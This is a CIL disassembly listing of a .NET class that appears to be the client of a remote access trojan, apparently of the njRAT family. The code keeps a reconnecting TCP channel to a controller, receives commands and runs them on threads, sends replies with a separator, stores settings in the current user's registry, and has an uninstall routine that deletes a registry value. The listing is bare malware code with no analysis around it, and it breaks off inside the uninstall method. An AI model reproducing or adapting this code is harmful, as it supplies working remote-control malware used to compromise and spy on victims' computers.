      IL_0022:  stloc.s    V_9
      IL_0024:  ldloc.s    V_9
      IL_0026:  brfalse.s  IL_002e

      IL_0028:  nop
      IL_0029:  leave      IL_0245

      IL_002e:  nop
      IL_002f:  ldsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
      IL_0034:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0039:  ldc.i4.0
      IL_003a:  cgt
      IL_003c:  stloc.s    V_9
      IL_003e:  ldloc.s    V_9
      IL_0040:  brfalse    IL_01e4

      IL_0045:  ldsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
      IL_004a:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_004f:  callvirt   instance int32 [System]System.Net.Sockets.Socket::get_Available()
      IL_0054:  ldc.i4.1
      IL_0055:  sub.ovf
      IL_0056:  ldc.i4.1
      IL_0057:  add.ovf
      IL_0058:  ldc.i4.1
      IL_0059:  sub.ovf
      IL_005a:  ldc.i4.1
      IL_005b:  add.ovf
      IL_005c:  newarr     [mscorlib]System.Byte
      IL_0061:  stsfld     uint8[] ClassLibrary1.OK::b
      IL_0066:  ldsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
      IL_006b:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_0070:  ldsfld     uint8[] ClassLibrary1.OK::b
      IL_0075:  ldc.i4.0
      IL_0076:  ldsfld     uint8[] ClassLibrary1.OK::b
      IL_007b:  ldlen
      IL_007c:  conv.ovf.i4
      IL_007d:  ldc.i4.0
      IL_007e:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Receive(uint8[],
                                                                                     int32,
                                                                                     int32,
                                                                                     valuetype [System]System.Net.Sockets.SocketFlags)
      IL_0083:  stloc.1
      IL_0084:  ldloc.1
      IL_0085:  ldc.i4.0
      IL_0086:  cgt
      IL_0088:  ldc.i4.0
      IL_0089:  ceq
      IL_008b:  stloc.s    V_9
      IL_008d:  ldloc.s    V_9
      IL_008f:  brfalse.s  IL_0097

      IL_0091:  nop
      IL_0092:  leave      IL_0245

      IL_0097:  nop
      IL_0098:  ldsfld     class [mscorlib]System.IO.MemoryStream ClassLibrary1.OK::MeM
      IL_009d:  ldsfld     uint8[] ClassLibrary1.OK::b
      IL_00a2:  ldc.i4.0
      IL_00a3:  ldloc.1
      IL_00a4:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_00a9:  nop
      IL_00aa:  br         IL_01da

      IL_00af:  ldsfld     class [mscorlib]System.IO.MemoryStream ClassLibrary1.OK::MeM
      IL_00b4:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_00b9:  stloc.s    V_6
      IL_00bb:  ldloca.s   V_6
      IL_00bd:  call       string ClassLibrary1.OK::BS(uint8[]&)
      IL_00c2:  ldsfld     string ClassLibrary1.OK::SPL
      IL_00c7:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00cc:  ldc.i4.0
      IL_00cd:  ceq
      IL_00cf:  stloc.s    V_9
      IL_00d1:  ldloc.s    V_9
      IL_00d3:  brfalse.s  IL_00da

      IL_00d5:  br         IL_0211

      IL_00da:  nop
      IL_00db:  ldsfld     class [mscorlib]System.IO.MemoryStream ClassLibrary1.OK::MeM
      IL_00e0:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_00e5:  ldsfld     string ClassLibrary1.OK::SPL
      IL_00ea:  call       class [mscorlib]System.Array ClassLibrary1.OK::fx(uint8[],
                                                                             string)
      IL_00ef:  stloc.2
      IL_00f0:  ldnull
      IL_00f1:  ldftn      void ClassLibrary1.OK::_Lambda__3(object)
      IL_00f7:  newobj     instance void [mscorlib]System.Threading.ParameterizedThreadStart::.ctor(object,
                                                                                                    native int)
      IL_00fc:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ParameterizedThreadStart)
      IL_0101:  stloc.3
      IL_0102:  ldloc.3
      IL_0103:  ldloc.2
      IL_0104:  ldc.i4.1
      IL_0105:  newarr     [mscorlib]System.Object
      IL_010a:  stloc.s    V_7
      IL_010c:  ldloc.s    V_7
      IL_010e:  ldc.i4.0
      IL_010f:  ldc.i4.0
      IL_0110:  box        [mscorlib]System.Int32
      IL_0115:  stelem.ref
      IL_0116:  nop
      IL_0117:  ldloc.s    V_7
      IL_0119:  ldnull
      IL_011a:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateIndexGet(object,
                                                                                                                             object[],
                                                                                                                             string[])
      IL_011f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0124:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0129:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_012e:  callvirt   instance void [mscorlib]System.Threading.Thread::Start(object)
      IL_0133:  nop
      IL_0134:  ldloc.3
      IL_0135:  ldc.i4     0xc8
      IL_013a:  callvirt   instance bool [mscorlib]System.Threading.Thread::Join(int32)
      IL_013f:  pop
      IL_0140:  ldsfld     class [mscorlib]System.IO.MemoryStream ClassLibrary1.OK::MeM
      IL_0145:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_014a:  nop
      IL_014b:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0150:  stsfld     class [mscorlib]System.IO.MemoryStream ClassLibrary1.OK::MeM
      IL_0155:  ldloc.2
      IL_0156:  callvirt   instance int32 [mscorlib]System.Array::get_Length()
      IL_015b:  ldc.i4.2
      IL_015c:  ceq
      IL_015e:  ldc.i4.0
      IL_015f:  ceq
      IL_0161:  stloc.s    V_9
      IL_0163:  ldloc.s    V_9
      IL_0165:  brfalse.s  IL_016c

      IL_0167:  br         IL_0211

      IL_016c:  nop
      IL_016d:  ldsfld     class [mscorlib]System.IO.MemoryStream ClassLibrary1.OK::MeM
      IL_0172:  ldloc.2
      IL_0173:  ldc.i4.1
      IL_0174:  newarr     [mscorlib]System.Object
      IL_0179:  stloc.s    V_7
      IL_017b:  ldloc.s    V_7
      IL_017d:  ldc.i4.0
      IL_017e:  ldc.i4.1
      IL_017f:  box        [mscorlib]System.Int32
      IL_0184:  stelem.ref
      IL_0185:  nop
      IL_0186:  ldloc.s    V_7
      IL_0188:  ldnull
      IL_0189:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateIndexGet(object,
                                                                                                                             object[],
                                                                                                                             string[])
      IL_018e:  castclass  uint8[]
      IL_0193:  ldc.i4.0
      IL_0194:  ldloc.2
      IL_0195:  ldc.i4.1
      IL_0196:  newarr     [mscorlib]System.Object
      IL_019b:  stloc.s    V_8
      IL_019d:  ldloc.s    V_8
      IL_019f:  ldc.i4.0
      IL_01a0:  ldc.i4.1
      IL_01a1:  box        [mscorlib]System.Int32
      IL_01a6:  stelem.ref
      IL_01a7:  nop
      IL_01a8:  ldloc.s    V_8
      IL_01aa:  ldnull
      IL_01ab:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateIndexGet(object,
                                                                                                                             object[],
                                                                                                                             string[])
      IL_01b0:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_01b5:  ldnull
      IL_01b6:  ldstr      "length"
      IL_01bb:  ldc.i4.0
      IL_01bc:  newarr     [mscorlib]System.Object
      IL_01c1:  ldnull
      IL_01c2:  ldnull
      IL_01c3:  ldnull
      IL_01c4:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_01c9:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_01ce:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(object)
      IL_01d3:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_01d8:  nop
      IL_01d9:  nop
      IL_01da:  ldc.i4.1
      IL_01db:  stloc.s    V_9
      IL_01dd:  ldloc.s    V_9
      IL_01df:  brtrue     IL_00af

      IL_01e4:  nop
      IL_01e5:  ldsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
      IL_01ea:  callvirt   instance class [System]System.Net.Sockets.NetworkStream [System]System.Net.Sockets.TcpClient::GetStream()
      IL_01ef:  callvirt   instance int32 [mscorlib]System.IO.Stream::ReadByte()
      IL_01f4:  stloc.0
      IL_01f5:  ldloc.0
      IL_01f6:  ldc.i4.m1
      IL_01f7:  ceq
      IL_01f9:  stloc.s    V_9
      IL_01fb:  ldloc.s    V_9
      IL_01fd:  brfalse.s  IL_0202

      IL_01ff:  nop
      IL_0200:  leave.s    IL_0245

      IL_0202:  nop
      IL_0203:  ldsfld     class [mscorlib]System.IO.MemoryStream ClassLibrary1.OK::MeM
      IL_0208:  ldloc.0
      IL_0209:  conv.ovf.u1
      IL_020a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::WriteByte(uint8)
      IL_020f:  nop
      IL_0210:  nop
      IL_0211:  nop
      IL_0212:  ldc.i4.1
      IL_0213:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0218:  nop
      IL_0219:  br         IL_0019

      IL_021e:  leave.s    IL_0242

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0220:  dup
      IL_0221:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0226:  stloc.s    V_5
      IL_0228:  nop
      IL_0229:  ldloc.s    V_5
      IL_022b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0230:  nop
      IL_0231:  ldloc.s    V_5
      IL_0233:  stloc.s    V_4
      IL_0235:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_023a:  nop
      IL_023b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0240:  leave.s    IL_0242

    }  // end handler
    IL_0242:  nop
    IL_0243:  nop
    IL_0244:  nop
    IL_0245:  nop
    IL_0246:  ldc.i4.0
    IL_0247:  stsfld     bool ClassLibrary1.OK::Cn
    IL_024c:  ldc.i4     0x9c4
    IL_0251:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0256:  nop
    IL_0257:  call       bool ClassLibrary1.OK::connect()
    IL_025c:  ldc.i4.0
    IL_025d:  ceq
    IL_025f:  stloc.s    V_9
    IL_0261:  ldloc.s    V_9
    IL_0263:  brfalse.s  IL_0267

    IL_0265:  br.s       IL_0245

    IL_0267:  nop
    IL_0268:  ldc.i4.1
    IL_0269:  stsfld     bool ClassLibrary1.OK::Cn
    IL_026e:  br         IL_0002

    IL_0273:  nop
    IL_0274:  ret
  } // end of method OK::RC

  .method public static string  RN(int32 c) cil managed
  {
    // Code size       93 (0x5d)
    .maxstack  5
    .locals init (int32 V_0,
             int32 V_1,
             class [mscorlib]System.Random V_2,
             string V_3,
             string V_4,
             string V_5,
             bool V_6)
    IL_0000:  nop
    IL_0001:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.VBMath::Randomize()
    IL_0006:  nop
    IL_0007:  newobj     instance void [mscorlib]System.Random::.ctor()
    IL_000c:  stloc.2
    IL_000d:  ldstr      ""
    IL_0012:  stloc.s    V_5
    IL_0014:  ldstr      "abcdefghijklmnopqrstuvwxyz"
    IL_0019:  stloc.s    V_4
    IL_001b:  ldarg.0
    IL_001c:  stloc.1
    IL_001d:  ldc.i4.1
    IL_001e:  stloc.0
    IL_001f:  br.s       IL_0049

    IL_0021:  ldloc.s    V_5
    IL_0023:  ldloc.s    V_4
    IL_0025:  ldloc.2
    IL_0026:  ldc.i4.0
    IL_0027:  ldloc.s    V_4
    IL_0029:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_002e:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                      int32)
    IL_0033:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
    IL_0038:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(char)
    IL_003d:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0042:  stloc.s    V_5
    IL_0044:  ldloc.0
    IL_0045:  ldc.i4.1
    IL_0046:  add.ovf
    IL_0047:  stloc.0
    IL_0048:  nop
    IL_0049:  ldloc.0
    IL_004a:  ldloc.1
    IL_004b:  cgt
    IL_004d:  ldc.i4.0
    IL_004e:  ceq
    IL_0050:  stloc.s    V_6
    IL_0052:  ldloc.s    V_6
    IL_0054:  brtrue.s   IL_0021

    IL_0056:  ldloc.s    V_5
    IL_0058:  stloc.3
    IL_0059:  br.s       IL_005b

    IL_005b:  ldloc.3
    IL_005c:  ret
  } // end of method OK::RN

  .method private static void  RS(object a,
                                  object e) cil managed
  {
    // Code size       147 (0x93)
    .maxstack  8
    .locals init (object V_0,
             string V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             object[] V_4)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldarg.1
      IL_0003:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0008:  stloc.0
      IL_0009:  ldloc.0
      IL_000a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_000f:  ldnull
      IL_0010:  ldstr      "Data"
      IL_0015:  ldc.i4.0
      IL_0016:  newarr     [mscorlib]System.Object
      IL_001b:  ldnull
      IL_001c:  ldnull
      IL_001d:  ldnull
      IL_001e:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0023:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0028:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_002d:  stloc.1
      IL_002e:  ldloc.0
      IL_002f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0034:  ldnull
      IL_0035:  ldstr      "Data"
      IL_003a:  ldc.i4.1
      IL_003b:  newarr     [mscorlib]System.Object
      IL_0040:  stloc.s    V_4
      IL_0042:  ldloc.s    V_4
      IL_0044:  ldc.i4.0
      IL_0045:  ldloc.1
      IL_0046:  stelem.ref
      IL_0047:  nop
      IL_0048:  ldloc.s    V_4
      IL_004a:  ldnull
      IL_004b:  ldnull
      IL_004c:  ldc.i4.1
      IL_004d:  ldc.i4.0
      IL_004e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSetComplex(object,
                                                                                                                             class [mscorlib]System.Type,
                                                                                                                             string,
                                                                                                                             object[],
                                                                                                                             string[],
                                                                                                                             class [mscorlib]System.Type[],
                                                                                                                             bool,
                                                                                                                             bool)
      IL_0053:  nop
      IL_0054:  ldstr      "rs"
      IL_0059:  ldsfld     string ClassLibrary1.OK::Y
      IL_005e:  ldloca.s   V_1
      IL_0060:  call       string ClassLibrary1.OK::ENB(string&)
      IL_0065:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_006a:  call       bool ClassLibrary1.OK::Send(string)
      IL_006f:  pop
      IL_0070:  leave.s    IL_0090

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0072:  dup
      IL_0073:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0078:  stloc.3
      IL_0079:  nop
      IL_007a:  ldloc.3
      IL_007b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0080:  nop
      IL_0081:  ldloc.3
      IL_0082:  stloc.2
      IL_0083:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0088:  nop
      IL_0089:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_008e:  leave.s    IL_0090

    }  // end handler
    IL_0090:  nop
    IL_0091:  nop
    IL_0092:  ret
  } // end of method OK::RS

  .method public static uint8[]  SB(string& S) cil managed
  {
    // Code size       18 (0x12)
    .maxstack  2
    .locals init (uint8[] V_0)
    IL_0000:  nop
    IL_0001:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_Default()
    IL_0006:  ldarg.0
    IL_0007:  ldind.ref
    IL_0008:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_000d:  stloc.0
    IL_000e:  br.s       IL_0010

    IL_0010:  ldloc.0
    IL_0011:  ret
  } // end of method OK::SB

  .method public static bool  Send(string S) cil managed
  {
    // Code size       18 (0x12)
    .maxstack  1
    .locals init (bool V_0)
    IL_0000:  nop
    IL_0001:  ldarga.s   S
    IL_0003:  call       uint8[] ClassLibrary1.OK::SB(string&)
    IL_0008:  call       bool ClassLibrary1.OK::Sendb(uint8[])
    IL_000d:  stloc.0
    IL_000e:  br.s       IL_0010

    IL_0010:  ldloc.0
    IL_0011:  ret
  } // end of method OK::Send

  .method public static bool  Sendb(uint8[] b) cil managed
  {
    // Code size       276 (0x114)
    .maxstack  5
    .locals init (bool V_0,
             class [mscorlib]System.IO.FileInfo V_1,
             bool V_2,
             class [mscorlib]System.IO.MemoryStream V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.IO.FileInfo V_8,
             bool V_9)
    IL_0000:  nop
    IL_0001:  ldsfld     bool ClassLibrary1.OK::Cn
    IL_0006:  ldc.i4.0
    IL_0007:  ceq
    IL_0009:  stloc.s    V_9
    IL_000b:  ldloc.s    V_9
    IL_000d:  brfalse.s  IL_0016

    IL_000f:  ldc.i4.0
    IL_0010:  stloc.2
    IL_0011:  br         IL_0112

    IL_0016:  nop
    IL_0017:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
    IL_001c:  stloc.1
    IL_001d:  nop
    IL_001e:  ldloc.1
    IL_001f:  stloc.s    V_8
    IL_0021:  ldloc.s    V_8
    IL_0023:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    IL_0028:  nop
    IL_0029:  nop
    .try
    {
      IL_002a:  ldsfld     bool ClassLibrary1.OK::Cn
      IL_002f:  ldc.i4.0
      IL_0030:  ceq
      IL_0032:  stloc.s    V_9
      IL_0034:  ldloc.s    V_9
      IL_0036:  brfalse.s  IL_003f

      IL_0038:  ldc.i4.0
      IL_0039:  stloc.0
      IL_003a:  br         IL_0101

      IL_003f:  nop
      IL_0040:  nop
      .try
      {
        IL_0041:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0046:  stloc.3
        IL_0047:  ldloc.3
        IL_0048:  ldarg.0
        IL_0049:  ldc.i4.0
        IL_004a:  ldarg.0
        IL_004b:  ldlen
        IL_004c:  conv.ovf.i4
        IL_004d:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0052:  nop
        IL_0053:  ldloc.3
        IL_0054:  ldsflda    string ClassLibrary1.OK::SPL
        IL_0059:  call       uint8[] ClassLibrary1.OK::SB(string&)
        IL_005e:  ldc.i4.0
        IL_005f:  ldsfld     string ClassLibrary1.OK::SPL
        IL_0064:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0069:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_006e:  nop
        IL_006f:  ldsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
        IL_0074:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_0079:  ldloc.3
        IL_007a:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_007f:  ldc.i4.0
        IL_0080:  ldloc.3
        IL_0081:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
        IL_0086:  conv.ovf.i4
        IL_0087:  ldc.i4.0
        IL_0088:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Send(uint8[],
                                                                                    int32,
                                                                                    int32,
                                                                                    valuetype [System]System.Net.Sockets.SocketFlags)
        IL_008d:  pop
        IL_008e:  ldloc.3
        IL_008f:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
        IL_0094:  nop
        IL_0095:  ldc.i4.1
        IL_0096:  stloc.0
        IL_0097:  leave.s    IL_0100

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0099:  dup
        IL_009a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_009f:  stloc.s    V_5
        IL_00a1:  nop
        IL_00a2:  ldloc.s    V_5
        IL_00a4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00a9:  nop
        IL_00aa:  ldloc.s    V_5
        IL_00ac:  stloc.s    V_4
        IL_00ae:  nop
        .try
        {
          IL_00af:  ldsfld     bool ClassLibrary1.OK::Cn
          IL_00b4:  stloc.s    V_9
          IL_00b6:  ldloc.s    V_9
          IL_00b8:  brfalse.s  IL_00c5

          IL_00ba:  ldsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
          IL_00bf:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
          IL_00c4:  nop
          IL_00c5:  nop
          IL_00c6:  leave.s    IL_00ea

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_00c8:  dup
          IL_00c9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_00ce:  stloc.s    V_7
          IL_00d0:  nop
          IL_00d1:  ldloc.s    V_7
          IL_00d3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_00d8:  nop
          IL_00d9:  ldloc.s    V_7
          IL_00db:  stloc.s    V_6
          IL_00dd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_00e2:  nop
          IL_00e3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_00e8:  leave.s    IL_00ea

        }  // end handler
        IL_00ea:  nop
        IL_00eb:  ldc.i4.0
        IL_00ec:  stsfld     bool ClassLibrary1.OK::Cn
        IL_00f1:  ldc.i4.0
        IL_00f2:  stloc.0
        IL_00f3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00f8:  nop
        IL_00f9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00fe:  leave.s    IL_0100

      }  // end handler
      IL_0100:  nop
      IL_0101:  nop
      IL_0102:  nop
      IL_0103:  leave.s    IL_010e

    }  // end .try
    finally
    {
      IL_0105:  ldloc.s    V_8
      IL_0107:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_010c:  nop
      IL_010d:  endfinally
    }  // end handler
    IL_010e:  ldloc.0
    IL_010f:  stloc.2
    IL_0110:  br.s       IL_0112

    IL_0112:  ldloc.2
    IL_0113:  ret
  } // end of method OK::Sendb

  .method public static object  STV(string n,
                                    string t) cil managed
  {
    // Code size       98 (0x62)
    .maxstack  3
    .locals init (object V_0,
             object V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_0007:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0011:  ldstr      "Software\\"
      IL_0016:  ldsfld     string ClassLibrary1.OK::RG
      IL_001b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0020:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
      IL_0025:  ldarg.0
      IL_0026:  ldarg.1
      IL_0027:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_002c:  nop
      IL_002d:  ldc.i4.1
      IL_002e:  box        [mscorlib]System.Boolean
      IL_0033:  stloc.0
      IL_0034:  leave.s    IL_005b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0036:  dup
      IL_0037:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003c:  stloc.3
      IL_003d:  nop
      IL_003e:  ldloc.3
      IL_003f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0044:  nop
      IL_0045:  ldloc.3
      IL_0046:  stloc.2
      IL_0047:  ldc.i4.0
      IL_0048:  box        [mscorlib]System.Boolean
      IL_004d:  stloc.0
      IL_004e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0053:  nop
      IL_0054:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0059:  leave.s    IL_005b

    }  // end handler
    IL_005b:  nop
    IL_005c:  ldloc.0
    IL_005d:  stloc.1
    IL_005e:  br.s       IL_0060

    IL_0060:  ldloc.1
    IL_0061:  ret
  } // end of method OK::STV

  .method public static void  UNS() cil managed noinlining nooptimization
  {
    // Code size       479 (0x1df)
    .maxstack  4
    .locals init (class [mscorlib]System.Exception V_0,
             class [mscorlib]System.Exception V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             bool V_12)
    IL_0000:  nop
    IL_0001:  ldc.i4.0
    IL_0002:  call       void ClassLibrary1.OK::pr(int32)
    IL_0007:  nop
    IL_0008:  nop
    .try
    {
      IL_0009:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_000e:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0013:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0018:  ldsfld     string ClassLibrary1.OK::sf
      IL_001d:  ldc.i4.1
      IL_001e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0023:  ldsfld     string ClassLibrary1.OK::RG
      IL_0028:  ldc.i4.0
      IL_0029:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_002e:  nop
      IL_002f:  leave.s    IL_004f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0031:  dup
      IL_0032:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0037:  stloc.1
      IL_0038:  nop
      IL_0039:  ldloc.1
      IL_003a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003f:  nop
      IL_0040:  ldloc.1
      IL_0041:  stloc.0
      IL_0042:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0047:  nop
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_004d:  leave.s    IL_004f

    }  // end handler
    IL_004f:  nop
